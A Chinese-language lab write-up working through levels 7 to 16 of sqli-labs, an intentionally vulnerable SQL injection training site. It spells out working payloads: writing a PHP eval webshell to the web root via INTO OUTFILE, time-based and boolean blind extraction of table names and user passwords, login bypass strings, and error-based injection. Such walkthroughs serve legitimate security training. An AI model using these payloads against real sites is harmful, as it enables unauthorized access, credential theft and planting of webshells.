# 七、答题模式-Background-3 导入导出相关操作的讲解-Less-7~16

### Less-7

源码：<br>
`$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`

首先我们先正常输入id值，得到正常的输出。再构造语句：
`?id=1')) union select 1,2,3 into outfile 'c:\\wamp\\www\\test000.txt'--+`

这里输出You have an error in your SQL syntax。显示sql出错，但是没有关系，文件已经生成了。

此时，同样可以构造“一句话木马”导入进去。

`?id=1')) union select 1,2,"<?php @eval($_post['a'])?>" into outfile 'c:\\wamp\\www\\test.php'--+`

然后就是菜刀getshell的后续操作了。


### Less-8

这里是 `?id=10' or 1=1--+` 进行注入，查看源码是屏蔽了mysql_error()，无法使用报错型注入，其他payload参考Less-5。


### Less-9

标题为 Blind- Time based- Single Quotes- String《基于时间-单引号》，显然是利用延时注入。

直接一层 `?id=1' or 1=1--+` 得到正常输出

这里开始利用sleep()延时注入。

- 猜测数据库：<br>
`?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`<br>
sql构造为当数据库名第一位字母为ascii(s)=115，if正确则立即返回，不正确则等待5秒钟。<br>
修改substr参数得到第二个字母，以此类推得到数据库名称是security。
- 猜测security数据表：<br>
`if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+`<br>
这里猜的第一张数据表的第一个字母为ascii(e)=101，if正确则立即返回，不正确则等待5秒钟。<br>
修改limit参数可得到第二张表，修改substr参数可得到表全名，以此类推得到所有数据表emails,referers,uagents,users。
- 猜测users表的列<br>
`?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+`<br>
这里猜得users表的第一列为ascii(i)=105。<br>
以此类推，得到列名是id,username,password。
- 猜测username值
`?id=1' and if(ascii(substr((select username from security.users limit 0,1),1,1))=68,1,sleep(5))--+`<br>
这里得到username第一行的第一位。<br>
以此类推，可得到username/password所有内容。

当然，这里还可以使用benchmark()函数进行注入，这里不进行演示。


### Less-10

标题是《基于时间-双引号》，和Less-9类似，查看源码可知，不管sql对错的前端显示都是一样的，因此延时类注入是适合的，此处只做一个演示。

`?id=1" and if((ascii(substr(user(),1,1))=65),1,sleep(5))--+`<br>
延时5秒，所以用户第一位不是65A。


### Less-11

这里是初次接触POST注入，是一个登陆入口。

首先用hackbar的load url可以提取到需要post的数据。

再第一步就是测试万能密码 `admin' or '1'='1`，密码随意。<br>
构造出来的payload是这样的 `uname=admin' or '1'='1#&passwd=1`<br>

显示是登录成功的，登录账号为admin密码为admin。<br>
通过查看后端代码，构造出的sql是这样的：`@$sql="SELECT username, password FROM users WHERE username='admin'or'1'='1# and password='$passwd' LIMIT 0,1";`

这里利用的是 or 恒成立。


> ps：这里个人再深入一层，加入我不清楚存在admin账号，我就试举例构造 `a' or 1=1--+` ，密码随意<br>
得到的结果是登录账号Dumb登录密码Dumb，显示是登录成功的。<br>
那么我即使不知道账号也能绕过去，并且可以得到前端提示的一个用户。

接着天书的指引，我们用union注入尝试：<br>
`passwd=1&uname=1admin' union select 1,database()--+`

那么前端回显的是database为security。这种叫get注入，是常用的手法，还有其他方法注入，天书在后面的关卡会给示例。


### Less-12

这里Less-12和Less-11类似，只不过在sql语句上多了一弯口。

首先构造单/双引号，在构造双引号后得到提示是 `")` 。

知道这点之后payload就简单了：<br>
`passwd=1&uname=admin")--+` 得admin/admin<br>
`passwd=1&uname=1admin") or 1=1--+`得Dump/Dump


### Less-13

这里我们输入 `admin'` ，会看到报错是对id进行了 `')` 处理。

根据前面的方式绕过，登录成功后是没有回显登录成功的用户名的。只是显示登录结果，那么这里我们就用下布尔类型的盲注了。

猜测数据库的第一位：<br>
`passwd=1&uname=admin') and left(database(),1)>'a'--+`

> 注意这里我们使用的是and，是利用了uname=admin的。

这里猜测后是登录成功的，接下来就可以逐位猜测了，如Less-5。提一个小建议，在逐位猜测的过程可以利用二分法。


### Less-14

这里直接测试<br>
`passwd=1&uname=admin" and left(database(),1)>'a'--+` 

可见是登录成功的，没有登录提示。那么这里利用一下报错注入：<br>
`passwd=1&uname=admin" and extractvalue(1,concat(0x7e,(select version()),0x7e))--+`

这里就提示了：XPATH syntax error: '~5.6.17~'


### Less-15

本关卡没有报错提示，只能猜测注入，可看源码得知id进行了 `'id'` 的处理。

这里我们利用延时注入，猜测数据库名第一位：<br>
`passwd=1&uname=admin' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`

正确的时候可以直接登录，不正确的时候延时5秒且登录失败。


### Less-16

本关卡和Less-15的处理是一样的，同样的使用延时注入的方法进行解决。多次猜测或从源码中可知，进行了 `("id")` 的处理。

构造payload：<br>
`passwd=1&uname=1admin") or 1=1--+` 登录成功<br>

**技巧**：注意这里，假如不知道存在的账号，也可以构造or语句。<br>
`passwd=1&uname=1admin")  or if(ascii(substr(database(),1,1))=114,1,sleep(5))--+`<br>
这里账号为1admin，再借用or语句得1或延时注入，均可得到登录成功、数据库名第一位为115s、立即响应或休眠5秒的结果。

> ps：优先级 and > or



